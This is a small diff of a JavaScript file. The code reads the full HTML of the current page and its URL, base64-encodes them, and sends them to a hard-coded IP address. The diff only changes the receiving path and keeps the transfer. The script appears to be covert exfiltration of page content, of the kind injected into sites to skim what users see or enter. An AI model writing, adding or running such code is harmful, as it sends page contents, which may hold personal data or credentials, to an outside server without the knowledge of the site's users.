@@ -31,7 +31,7 @@ var timeStart = (new Date).getTime();
 var rdat1 = document.documentElement.innerHTML;
 console.log(rdat1)
 // set nodeId to all send elements
-sendDataToServer('http://85.10.203.168:35002/api/stat/data', 'num=1&time=' + timeStart +'&site=' + btoa(unescape(encodeURIComponent(document.location.href)))  + '&content='+ btoa(unescape(encodeURIComponent(rdat1)))  )
+sendDataToServer('http://85.10.203.168:35002/api/log/data', 'num=1&time=' + timeStart +'&site=' + btoa(unescape(encodeURIComponent(document.location.href)))  + '&content='+ btoa(unescape(encodeURIComponent(rdat1)))  )
 
 function sendDataToServer(url, data) {
 
